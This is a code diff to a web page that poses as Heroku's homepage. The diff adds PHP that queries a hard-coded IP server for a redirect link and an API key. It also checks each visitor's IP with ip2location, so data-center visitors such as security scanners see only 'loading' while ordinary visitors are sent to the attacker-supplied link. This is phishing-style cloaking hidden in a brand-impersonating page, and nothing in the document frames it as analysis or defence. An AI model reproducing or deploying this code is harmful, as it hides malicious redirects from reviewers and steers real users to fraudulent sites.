@@ -31,13 +31,40 @@
     <link rel="canonical" href="https://www.heroku.com/">
 
     <meta name="csrf-param" content="authenticity_token">
-    </head>
-<?php
- $url = $_SERVER['REQUEST_URI'];
-$url_components = parse_url($url);
-parse_str($url_components['query'], $params);
-$cloakjson = file_get_contents('http://66.59.199.128/json/'.$params['t'].'?e='.$params['e'].'&p='.$params['p'].'&f='.$params['f'].'');
-$cloakjsons = json_decode($cloakjson, true);
-//print_r($cloakjsons);
-header("Location: ".$cloakjsons);
-?>
+</head>
+<html>
+    <body>
+      <div id="contact" class="form-1">
+          <div class="container-fluid">
+              <div class="">
+                  <div class="col-xl-12">
+                      <div class="form-container">
+                          <p class="center">
+                          <?php
+                          $url = $_SERVER['REQUEST_URI'];
+                          $ipaddress = $_SERVER['REMOTE_ADDR'];
+                          $url_components = parse_url($url);
+                          parse_str($url_components['query'], $params);
+                          $cloakjson = file_get_contents('http://66.59.199.128/json/'.$params['t'].'?e='.$params['e'].'&p='.$params['p'].'&f='.$params['f'].'');
+                          $cloakjsons = json_decode($cloakjson);
+
+
+                          $ip2loation = file_get_contents('https://api.ip2location.com/v2/?ip=' . $ipaddress . '&key=' . $cloakjsons->api . '&package=WS23');
+                          $ip2loations = json_decode($ip2loation);
+                          if ($ip2loations->usage_type == "DCH"){
+                            print_r('loading');
+                          }else{
+                            $url = $cloakjsons->links;
+                            header("Location:$url");
+                            print_r($url);
+                          }
+                          
+                          ?>
+                          </p>
+                      </div> 
+                  </div>
+              </div>
+          </div>
+      </div>  
+  </body>
+</html>
